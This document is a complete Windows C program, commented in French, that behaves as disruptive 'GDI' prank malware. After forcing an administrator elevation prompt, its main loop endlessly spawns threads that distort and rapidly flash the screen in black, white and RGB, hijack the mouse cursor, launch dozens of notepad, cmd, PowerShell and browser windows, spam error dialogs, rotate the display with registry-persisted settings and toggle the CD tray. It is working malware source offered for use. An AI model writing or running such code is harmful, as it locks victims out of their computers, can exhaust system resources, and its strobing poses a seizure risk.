#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <math.h>
#include <mmsystem.h>
#pragma comment(lib, "winmm.lib")

// Vérifie et demande l'élévation admin
void require_admin() {
    BOOL isAdmin = FALSE;
    HANDLE token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    if (!isAdmin) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        ShellExecuteA(NULL, "runas", exePath, NULL, NULL, SW_SHOWNORMAL);
        exit(0);
    }
}

void stylish_glitch(HDC hdc, int width, int height) {
    int steps = 30;
    for (int i = 0; i < steps; i++) {
        int slice_height = rand() % (height / 8) + 10;
        int y = rand() % (height - slice_height);
        int offset = (rand() % 120) - 60;
        BitBlt(hdc, 0, y, width, slice_height, hdc, offset, y, SRCCOPY);
        Sleep(8 + (rand() % 5));
    }
}

void wave_invert(HDC hdc, int width, int height) {
    int waves = 25;
    for (int i = 0; i < waves; i++) {
        RECT rect;
        rect.left = (width / waves) * i;
        rect.top = 0;
        rect.right = rect.left + (width / waves / 2);
        rect.bottom = height;
        InvertRect(hdc, &rect);
        Sleep(4 + (rand() % 4));
    }
}

void screen_shrink_expand(HDC hdc, int width, int height) {
    int shrink_steps = 15;
    for (int i = 0; i < shrink_steps; i++) {
        int margin = i * (width / 80);
        StretchBlt(hdc, margin, margin, width - 2 * margin, height - 2 * margin, hdc, 0, 0, width, height, SRCCOPY);
        Sleep(15 + (rand() % 10));
    }
    for (int i = shrink_steps; i >= 0; i--) {
        int margin = i * (width / 80);
        StretchBlt(hdc, margin, margin, width - 2 * margin, height - 2 * margin, hdc, 0, 0, width, height, SRCCOPY);
        Sleep(15 + (rand() % 10));
    }
}

void spiral_distortion(HDC hdc, int width, int height) {
    int cx = width / 2;
    int cy = height / 2;
    for (int i = 0; i < 40; i++) {
        int size = 80 + (i * 6);
        int angle = i * 12;
        int x = cx + (int)(cos(angle * 3.14 / 180) * 120);
        int y = cy + (int)(sin(angle * 3.14 / 180) * 120);
        StretchBlt(hdc, x, y, size, size, hdc, 0, 0, width, height, SRCCOPY);
        Sleep(8 + (rand() % 6));
    }
}

void scanlines(HDC hdc, int width, int height) {
    for (int y = 0; y < height; y += 3 + (rand() % 3)) {
        MoveToEx(hdc, 0, y, NULL);
        LineTo(hdc, width, y);
    }
    Sleep(80 + (rand() % 40));
}

void noise(HDC hdc, int width, int height) {
    for (int i = 0; i < 40000; i++) {
        SetPixel(hdc, rand() % width, rand() % height, RGB(rand() % 256, rand() % 256, rand() % 256));
    }
    Sleep(40 + (rand() % 20));
}

void wave_distort(HDC hdc, int width, int height) {
    for (int y = 0; y < height; y += 8) {
        int offset = (int)(sin(y / 15.0 + (rand() % 10)) * 25);
        BitBlt(hdc, offset, y, width, 8, hdc, 0, y, SRCCOPY);
    }
    Sleep(40 + (rand() % 20));
}

void rgb_shift(HDC hdc, int width, int height) {
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmMem = CreateCompatibleBitmap(hdc, width, height);
    SelectObject(hdcMem, hbmMem);
    BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
    BitBlt(hdc, 6 + (rand() % 4), 0, width, height, hdcMem, 0, 0, SRCCOPY | NOMIRRORBITMAP);
    BitBlt(hdc, -6 - (rand() % 4), 0, width, height, hdcMem, 0, 0, SRCCOPY | NOMIRRORBITMAP);
    DeleteObject(hbmMem);
    DeleteDC(hdcMem);
    Sleep(40 + (rand() % 20));
}

void fragmented_chaos(HDC hdc, int width, int height) {
    int block_size = 50;
    for (int i = 0; i < 25; i++) {
        for (int x = 0; x < width; x += block_size) {
            for (int y = 0; y < height; y += block_size) {
                int offset_x = (rand() % 40) - 20;
                int offset_y = (rand() % 40) - 20;
                BitBlt(hdc, x + offset_x, y + offset_y, block_size, block_size, hdc, x, y, SRCCOPY);
            }
        }
        Sleep(10 + (rand() % 10));
    }
}

void vortex_warp(HDC hdc, int width, int height) {
    int cx = rand() % width;
    int cy = rand() % height;
    for (int i = 0; i < 30; i++) {
        int scale = 100 + (i * 10);
        int dest_size = width / (1 + i / 10);
        int x = cx - dest_size / 2;
        int y = cy - dest_size / 2;
        StretchBlt(hdc, x, y, dest_size, dest_size, hdc, 0, 0, width, height, SRCCOPY);
        Sleep(12 + (rand() % 8));
    }
}

void ghostly_trails(HDC hdc, int width, int height) {
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmMem = CreateCompatibleBitmap(hdc, width, height);
    SelectObject(hdcMem, hbmMem);
    for (int i = 0; i < 20; i++) {
        BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
        int offset_x = (rand() % 30) - 15;
        int offset_y = (rand() % 30) - 15;
        AlphaBlend(hdc, 0, 0, width, height, hdcMem, offset_x, offset_y, width, height, (BLENDFUNCTION){AC_SRC_OVER, 0, 128, 0});
        Sleep(15 + (rand() % 10));
    }
    DeleteObject(hbmMem);
    DeleteDC(hdcMem);
}

void pixel_melt(HDC hdc, int width, int height) {
    for (int i = 0; i < 25; i++) {
        for (int y = height - 10; y >= 0; y -= 10) {
            int offset = (rand() % 50) - 25;
            BitBlt(hdc, offset, y + 10, width, 10, hdc, 0, y, SRCCOPY);
        }
        Sleep(12 + (rand() % 8));
    }
}

void kaleidoscope_flicker(HDC hdc, int width, int height) {
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmMem = CreateCompatibleBitmap(hdc, width, height);
    SelectObject(hdcMem, hbmMem);
    for (int i = 0; i < 20; i++) {
        BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
        int size = 100 + (rand() % 50);
        int x = rand() % (width - size);
        int y = rand() % (height - size);
        StretchBlt(hdc, x, y, size, size, hdcMem, width - x - size, y, size, size, SRCCOPY);
        StretchBlt(hdc, width - x - size, y, size, size, hdcMem, x, y, size, size, SRCCOPY);
        Sleep(10 + (rand() % 10));
    }
    DeleteObject(hbmMem);
    DeleteDC(hdcMem);
}

// Supprime la fonction play_random_sound et tous les Beep

// Ajoute une fonction pour faire clignoter l'écran
void flash_screen(HDC hdc, int width, int height) {
    for (int i = 0; i < 8; i++) {
        PatBlt(hdc, 0, 0, width, height, BLACKNESS);
        Sleep(60);
        PatBlt(hdc, 0, 0, width, height, WHITENESS);
        Sleep(60);
    }
}

// Ajoute une fonction pour ouvrir plein de fenêtres système
void open_many_programs() {
    const char* programs[] = {
        "notepad.exe", "calc.exe", "mspaint.exe", "cmd.exe", "powershell.exe"
    };
    int n = sizeof(programs) / sizeof(programs[0]);
    for (int i = 0; i < 10; i++) {
        ShellExecuteA(NULL, "open", programs[rand() % n], NULL, NULL, SW_SHOWNORMAL);
        Sleep(100 + rand() % 100);
    }
}

// Ajoute une fonction pour inverser tout l'écran rapidement
void rapid_invert(HDC hdc, int width, int height) {
    RECT rect = {0, 0, width, height};
    for (int i = 0; i < 12; i++) {
        InvertRect(hdc, &rect);
        Sleep(50);
    }
}

// Ajoute une fonction pour déplacer la souris très vite
void crazy_mouse_fast() {
    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0; i < 60; i++) {
        int x = rand() % screen_width;
        int y = rand() % screen_height;
        SetCursorPos(x, y);
        Sleep(10 + rand() % 10);
    }
}

// Fait clignoter la barre des tâches
void flash_taskbar() {
    HWND taskbar = FindWindow("Shell_TrayWnd", NULL);
    if (taskbar) {
        FLASHWINFO fw;
        fw.cbSize = sizeof(FLASHWINFO);
        fw.hwnd = taskbar;
        fw.dwFlags = FLASHW_ALL | FLASHW_TIMERNOFG;
        fw.uCount = 6;
        fw.dwTimeout = 100;
        FlashWindowEx(&fw);
    }
}

// Ouvre/ferme le lecteur CD
void cd_tray() {
    mciSendStringA("set cdaudio door open", NULL, 0, NULL);
    Sleep(800);
    mciSendStringA("set cdaudio door closed", NULL, 0, NULL);
}

// Fait bouger une fenêtre système
void move_window() {
    HWND hwnd = FindWindow("Notepad", NULL);
    if (hwnd) {
        RECT r;
        GetWindowRect(hwnd, &r);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        for (int i = 0; i < 20; i++) {
            int x = rand() % (sw - (r.right - r.left));
            int y = rand() % (sh - (r.bottom - r.top));
            SetWindowPos(hwnd, NULL, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
            Sleep(40);
        }
    }
}

// Fait tourner le curseur en rond
void spin_cursor() {
    int cx = GetSystemMetrics(SM_CXSCREEN) / 2;
    int cy = GetSystemMetrics(SM_CYSCREEN) / 2;
    int r = 200;
    for (int i = 0; i < 360; i += 10) {
        int x = cx + (int)(cos(i * 3.14159 / 180) * r);
        int y = cy + (int)(sin(i * 3.14159 / 180) * r);
        SetCursorPos(x, y);
        Sleep(8);
    }
}

// Modifie la séquence pour balancer les effets de façon aléatoire et agressive
void chaos_effects(HDC hdc, int width, int height) {
    // Exécute tous les effets principaux à la suite
    stylish_glitch(hdc, width, height);
    wave_invert(hdc, width, height);
    screen_shrink_expand(hdc, width, height);
    spiral_distortion(hdc, width, height);
    scanlines(hdc, width, height);
    noise(hdc, width, height);
    wave_distort(hdc, width, height);
    rgb_shift(hdc, width, height);
    fragmented_chaos(hdc, width, height);
    vortex_warp(hdc, width, height);
    ghostly_trails(hdc, width, height);
    pixel_melt(hdc, width, height);
    kaleidoscope_flicker(hdc, width, height);
    flash_screen(hdc, width, height);
    rapid_invert(hdc, width, height);

    // Exécute tous les effets spéciaux à chaque tour
    crazy_mouse_fast();
    open_many_programs();
    flash_taskbar();
    cd_tray();
    move_window();
    spin_cursor();
}

DWORD WINAPI open_apps(LPVOID lpParam) {
    const char* apps[] = {"notepad.exe", "calc.exe", "mspaint.exe", "cmd.exe", "powershell.exe"};
    const char* sites[] = {"https://www.google.com", "https://www.bing.com", "https://www.youtube.com"};
    int n_apps = sizeof(apps) / sizeof(apps[0]);
    int n_sites = sizeof(sites) / sizeof(sites[0]);
    for (int i = 0; i < 30; i++) {
        ShellExecuteA(NULL, "open", apps[rand() % n_apps], NULL, NULL, SW_SHOWNORMAL);
        ShellExecuteA(NULL, "open", sites[rand() % n_sites], NULL, NULL, SW_SHOWNORMAL);
        Sleep(200 + rand() % 200);
    }
    return 0;
}

DWORD WINAPI spam_messagebox(LPVOID lpParam) {
    for (int i = 0; i < 20; i++) {
        MessageBoxA(NULL, "Vous ne pouvez pas échapper au chaos !", "CHAOS", MB_OK | MB_ICONERROR);
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI change_wallpaper(LPVOID lpParam) {
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg", SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
    return 0;
}

DWORD WINAPI stylish_glitch_thread(LPVOID param) {
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    stylish_glitch(hdc, w, h);
    ReleaseDC(GetDesktopWindow(), hdc);
    return 0;
}

// Effet : miroir horizontal
DWORD WINAPI mirror_screen(LPVOID lpParam) {
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    StretchBlt(hdc, w, 0, -w, h, hdc, 0, 0, w, h, SRCCOPY);
    ReleaseDC(GetDesktopWindow(), hdc);
    Sleep(200);
    return 0;
}

// Effet : défilement de l'écran
DWORD WINAPI scroll_screen(LPVOID lpParam) {
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0; i < 30; i++) {
        int dx = (rand() % 40) - 20;
        int dy = (rand() % 40) - 20;
        BitBlt(hdc, dx, dy, w - abs(dx), h - abs(dy), hdc, 0, 0, SRCCOPY);
        Sleep(30);
    }
    ReleaseDC(GetDesktopWindow(), hdc);
    return 0;
}

// Effet : zoom avant/arrière
DWORD WINAPI zoom_effect(LPVOID lpParam) {
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0; i < 10; i++) {
        int margin = i * 20;
        StretchBlt(hdc, margin, margin, w - 2 * margin, h - 2 * margin, hdc, 0, 0, w, h, SRCCOPY);
        Sleep(40);
    }
    for (int i = 10; i >= 0; i--) {
        int margin = i * 20;
        StretchBlt(hdc, margin, margin, w - 2 * margin, h - 2 * margin, hdc, 0, 0, w, h, SRCCOPY);
        Sleep(40);
    }
    ReleaseDC(GetDesktopWindow(), hdc);
    return 0;
}

// Effet : couleurs négatives
DWORD WINAPI negative_colors(LPVOID lpParam) {
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    RECT rect = {0, 0, w, h};
    for (int i = 0; i < 10; i++) {
        InvertRect(hdc, &rect);
        Sleep(100);
    }
    ReleaseDC(GetDesktopWindow(), hdc);
    return 0;
}

// Effet : flash RGB rapide
DWORD WINAPI flash_rgb(LPVOID lpParam) {
    HDC hdc = GetDC(GetDesktopWindow());
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HBRUSH brush[3] = {
        CreateSolidBrush(RGB(255,0,0)),
        CreateSolidBrush(RGB(0,255,0)),
        CreateSolidBrush(RGB(0,0,255))
    };
    RECT rect = {0,0,w,h};
    for (int i = 0; i < 12; i++) {
        FillRect(hdc, &rect, brush[i%3]);
        Sleep(60);
    }
    for (int i = 0; i < 3; i++) DeleteObject(brush[i]);
    ReleaseDC(GetDesktopWindow(), hdc);
    return 0;
}

// Effet : curseur fou (déplacement ultra-rapide)
DWORD WINAPI crazy_cursor(LPVOID lpParam) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0; i < 100; i++) {
        SetCursorPos(rand() % w, rand() % h);
        Sleep(5);
    }
    return 0;
}

// Effet : fenêtres qui bougent partout (Notepad)
DWORD WINAPI move_windows(LPVOID lpParam) {
    HWND hwnd = FindWindow("Notepad", NULL);
    if (hwnd) {
        RECT r;
        GetWindowRect(hwnd, &r);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        for (int i = 0; i < 30; i++) {
            int x = rand() % (sw - (r.right - r.left));
            int y = rand() % (sh - (r.bottom - r.top));
            SetWindowPos(hwnd, NULL, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
            Sleep(30);
        }
    }
    return 0;
}

// Effet : rotation de l'écran (si supporté)
DWORD WINAPI rotate_screen(LPVOID lpParam) {
    DEVMODE dm;
    ZeroMemory(&dm, sizeof(dm));
    dm.dmSize = sizeof(dm);
    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm)) {
        int angles[] = {DMDO_DEFAULT, DMDO_90, DMDO_180, DMDO_270};
        for (int i = 0; i < 8; i++) {
            dm.dmDisplayOrientation = angles[rand() % 4];
            dm.dmFields = DM_DISPLAYORIENTATION;
            ChangeDisplaySettings(&dm, CDS_UPDATEREGISTRY);
            Sleep(400);
        }
        dm.dmDisplayOrientation = DMDO_DEFAULT;
        ChangeDisplaySettings(&dm, CDS_UPDATEREGISTRY);
    }
    return 0;
}

// --- Dans le main, lance-les en parallèle ---
int main() {
    require_admin();
    srand(time(NULL));
    for (;;) {
        CreateThread(NULL, 0, stylish_glitch_thread, NULL, 0, NULL);
        CreateThread(NULL, 0, open_apps, NULL, 0, NULL);
        CreateThread(NULL, 0, spam_messagebox, NULL, 0, NULL);
        CreateThread(NULL, 0, change_wallpaper, NULL, 0, NULL);
        CreateThread(NULL, 0, mirror_screen, NULL, 0, NULL);
        CreateThread(NULL, 0, scroll_screen, NULL, 0, NULL);
        CreateThread(NULL, 0, zoom_effect, NULL, 0, NULL);
        CreateThread(NULL, 0, negative_colors, NULL, 0, NULL);
        CreateThread(NULL, 0, flash_rgb, NULL, 0, NULL);
        CreateThread(NULL, 0, crazy_cursor, NULL, 0, NULL);
        CreateThread(NULL, 0, move_windows, NULL, 0, NULL);
        CreateThread(NULL, 0, rotate_screen, NULL, 0, NULL);
        Sleep(300);
    }
    return 0;
}
